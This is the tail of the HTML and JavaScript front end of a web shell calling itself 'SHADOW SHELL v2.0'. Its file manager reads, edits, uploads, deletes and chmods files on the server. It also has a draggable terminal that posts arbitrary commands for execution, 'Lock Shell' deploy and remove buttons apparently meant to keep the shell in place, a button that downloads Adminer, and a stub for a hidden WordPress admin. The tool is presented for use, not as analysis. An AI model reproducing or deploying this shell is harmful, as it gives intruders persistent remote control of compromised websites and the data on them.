            $('#breadcrumb').append(`
                <button onclick="loadDir('${res.home}')" 
                        class="ml-2 px-3 py-1 shadow-btn shadow-btn-success text-sm">
                    <i class="fas fa-home mr-1"></i>Shadow Home
                </button>
            `);

            // Update file list
            let html = '';
            res.files.forEach(f => {
                const fullPath = currentPath + '/' + f.name;
                const icon = f.type === 'folder' ? '📁' : '📄';
                const typeColor = f.type === 'folder' ? 'text-blue-400' : 'text-gray-300';
                const permColor = (f.readable && f.writable) ? 'text-green-500' : 'text-yellow-500';
                
                html += `
                    <tr class="hover:bg-gray-900/10 transition-colors">
                        <td class="p-3">
                            <a href="#" onclick="${f.type === 'folder' ? `loadDir('${fullPath}')` : `viewFile('${fullPath}')`}" 
                               class="flex items-center gap-2 ${typeColor} hover:text-gray-300">
                                ${icon} ${f.name}
                                ${!f.readable ? '<span class="text-xs text-red-500">[Locked]</span>' : ''}
                            </a>
                        </td>
                        <td class="p-3 text-center">
                            <span class="px-2 py-1 rounded text-xs ${f.type === 'folder' ? 'bg-blue-900/30 text-blue-300' : 'bg-gray-900/30 text-gray-300'}">
                                ${f.type}
                            </span>
                        </td>
                        <td class="p-3 text-center font-mono text-sm">${f.size}</td>
                        <td class="p-3 text-center text-sm text-gray-500">${f.lastmod}</td>
                        <td class="p-3 text-center">
                            <a href="#" onclick="chmodItem('${fullPath}', '${f.perm_octal}')" 
                               class="font-mono ${permColor} hover:text-gray-300" 
                               title="Click to change permissions">
                                ${f.perms}
                            </a>
                        </td>
                        <td class="p-3 text-center">
                            <div class="flex gap-2 justify-center">
                                <button onclick="renameItem('${fullPath}')" 
                                        class="shadow-btn text-xs px-3 py-1">
                                    <i class="fas fa-edit mr-1"></i>Rename
                                </button>
                                <button onclick="deleteItem('${fullPath}')" 
                                        class="shadow-btn shadow-btn-danger text-xs px-3 py-1">
                                    <i class="fas fa-trash mr-1"></i>Delete
                                </button>
                            </div>
                        </td>
                    </tr>
                `;
            });
            
            $('#filelistBody').html(html || '<tr><td colspan="6" class="p-8 text-center text-gray-600">Directory is empty</td></tr>');
            $('#fileCount').text(`${res.files.length} items`);
        });
    }

    // ===== File Operations =====
    function viewFile(file) {
        editingFile = file;
        showNotif('Loading file...', 'info');
        
        ajaxPost({cmd: 'read', target: file}, function(res) {
            if (res.status === 'success') {
                $('#fileContent').val(res.content);
                $('#fileModal').removeClass('hidden').addClass('flex');
                showNotif('File loaded successfully', 'success');
            } else {
                showNotif(res.message, 'error');
            }
        });
    }

    function closeModal() {
        $('#fileModal').removeClass('flex').addClass('hidden');
        editingFile = '';
    }

    function saveFile() {
        if (!editingFile) return;
        
        ajaxPost({
            cmd: 'save',
            target: editingFile,
            content: $('#fileContent').val()
        }, function(res) {
            showNotif(res.message, res.status);
            if (res.status === 'success') {
                closeModal();
                loadDir(currentPath);
            }
        });
    }

    function makefile() {
        const name = $('#newfile').val().trim();
        if (!name) {
            showNotif('Please enter a file name', 'warning');
            return;
        }
        
        ajaxPost({cmd: 'makefile', name: name, current: currentPath}, function(res) {
            showNotif(res.message, res.status);
            if (res.status === 'success') {
                $('#newfile').val('');
                loadDir(currentPath);
            }
        });
    }

    function mkdir() {
        const name = $('#newfolder').val().trim();
        if (!name) {
            showNotif('Please enter a folder name', 'warning');
            return;
        }
        
        ajaxPost({cmd: 'mkdir', name: name, current: currentPath}, function(res) {
            showNotif(res.message, res.status);
            if (res.status === 'success') {
                $('#newfolder').val('');
                loadDir(currentPath);
            }
        });
    }

    function renameItem(file) {
        const oldName = file.split('/').pop();
        const newName = prompt('Enter new name:', oldName);
        
        if (newName && newName !== oldName) {
            ajaxPost({cmd: 'rename', target: file, name: newName}, function(res) {
                showNotif(res.message, res.status);
                if (res.status === 'success') {
                    loadDir(currentPath);
                }
            });
        }
    }

    function deleteItem(file) {
        if (!confirm(`Are you sure you want to delete:\n${file}?`)) return;
        
        ajaxPost({cmd: 'delete', target: file}, function(res) {
            showNotif(res.message, res.status);
            if (res.status === 'success') {
                loadDir(currentPath);
            }
        });
    }

    function chmodItem(file, currentPerm) {
        const newPerm = prompt('Enter new permissions (e.g., 755):', currentPerm);
        
        if (newPerm && /^[0-7]{3,4}$/.test(newPerm)) {
            ajaxPost({cmd: 'chmod', target: file, mode: newPerm}, function(res) {
                showNotif(res.message, res.status);
                if (res.status === 'success') {
                    loadDir(currentPath);
                }
            });
        } else if (newPerm) {
            showNotif('Invalid permission format', 'error');
        }
    }

    // ===== Upload =====
    $('#uploadBtn').click(() => $('#uploadfile').click());

    $('#uploadfile').change(function() {
        const files = this.files;
        if (!files.length) return;
        
        const formData = new FormData();
        formData.append('cmd', 'upload');
        formData.append('current', currentPath);
        
        for (let i = 0; i < files.length; i++) {
            formData.append('file[]', files[i]);
        }
        
        showNotif(`Uploading ${files.length} file(s)...`, 'info');
        
        $.ajax({
            url: '',
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {
                showNotif(res.message, res.status);
                if (res.status === 'success') {
                    loadDir(currentPath);
                    $('#uploadfile').val('');
                }
            }
        });
    });

    // ===== Terminal =====
    $('#terminalBtn').click(() => {
        $('#floatingTerminal').removeClass('hidden');
        $('#floatingTerminalInput').focus();
    });

    $('#floatingTerminalClose').click(() => {
        $('#floatingTerminal').addClass('hidden');
    });

    // Terminal drag functionality
    $('#terminalHeader').on('mousedown', function(e) {
        terminalDragging = true;
        const terminal = $('#floatingTerminal');
        terminalOffset.x = e.clientX - terminal.offset().left;
        terminalOffset.y = e.clientY - terminal.offset().top;
    });

    $(document).on('mousemove', function(e) {
        if (terminalDragging) {
            const terminal = $('#floatingTerminal');
            terminal.css({
                left: e.clientX - terminalOffset.x,
                top: e.clientY - terminalOffset.y
            });
        }
    });

    $(document).on('mouseup', () => terminalDragging = false);

    // Terminal input
    $('#floatingTerminalInput').keypress(function(e) {
        if (e.which === 13) {
            const cmd = $(this).val().trim();
            if (!cmd) return;
            
            $(this).val('');
            $('#floatingTerminalContent').append(`
                <div class="mb-2">
                    <span class="text-green-600">$</span>
                    <span class="text-gray-400">${cmd}</span>
                </div>
            `);
            
            ajaxPost({cmd: 'terminal', command: cmd}, function(res) {
                if (res.status === 'success') {
                    $('#floatingTerminalContent').append(`
                        <div class="mb-4 text-gray-300 font-mono">
                            ${res.output.replace(/\n/g, '<br>')}
                        </div>
                    `);
                } else {
                    $('#floatingTerminalContent').append(`
                        <div class="mb-4 text-red-500">
                            Error: ${res.message}
                        </div>
                    `);
                }
                
                // Scroll to bottom
                const content = $('#floatingTerminalContent');
                content.scrollTop(content[0].scrollHeight);
            });
        }
    });

    // ===== Special Features =====
    $('#lockShellBtn').click(() => {
        if (confirm('Deploy Lock Shell protection?')) {
            ajaxPost({cmd: 'lockshell'}, res => {
                showNotif(res.message, res.status);
            });
        }
    });

    $('#unlockShellBtn').click(() => {
        if (confirm('Remove Lock Shell protection?')) {
            ajaxPost({cmd: 'unlockshell'}, res => {
                showNotif(res.message, res.status);
            });
        }
    });

    $('#adminerBtn').click(() => {
        showNotif('Downloading Adminer...', 'info');
        $.ajax({
            url: '?get=adminer',
            method: 'GET',
            dataType: 'json',
            success: function(res) {
                showNotif(res.message, res.status);
            },
            error: function() {
                showNotif('Download failed', 'error');
            }
        });
    });

    $('#hiddenwpBtn').click(() => {
        showNotif('WP Admin feature loading...', 'info');
        // WP Admin feature implementation
    });

    // ===== Initialize =====
    $(document).ready(() => {
        // Load initial directory
        loadDir(currentPath);
        
        // Add keyboard shortcuts
        $(document).keydown(function(e) {
            // Ctrl+R to refresh
            if (e.ctrlKey && e.key === 'r') {
                e.preventDefault();
                loadDir(currentPath);
            }
            // Esc to close modals
            if (e.key === 'Escape') {
                closeModal();
                $('#scannerModal').addClass('hidden');
                $('#wpAdminModal').addClass('hidden');
            }
        });
        
        // Add right-click context menu
        $(document).on('contextmenu', '#filelistBody tr', function(e) {
            e.preventDefault();
            // Add context menu functionality here
        });
        
        // Initial notification
        setTimeout(() => {
            showNotif('SHADOW SHELL v2.0 initialized successfully', 'success');
        }, 1000);
    });

    // ===== Drag and Drop Upload =====
    $(document).on('dragover', function(e) {
        e.preventDefault();
        $('body').addClass('border-2 border-dashed border-gray-600/50');
    });

    $(document).on('dragleave drop', function(e) {
        e.preventDefault();
        $('body').removeClass('border-2 border-dashed border-gray-600/50');
    });

    $(document).on('drop', function(e) {
        e.preventDefault();
        const files = e.originalEvent.dataTransfer.files;
        if (files.length) {
            $('#uploadfile')[0].files = files;
            $('#uploadfile').trigger('change');
        }
    });
    </script>
</body>
</html>
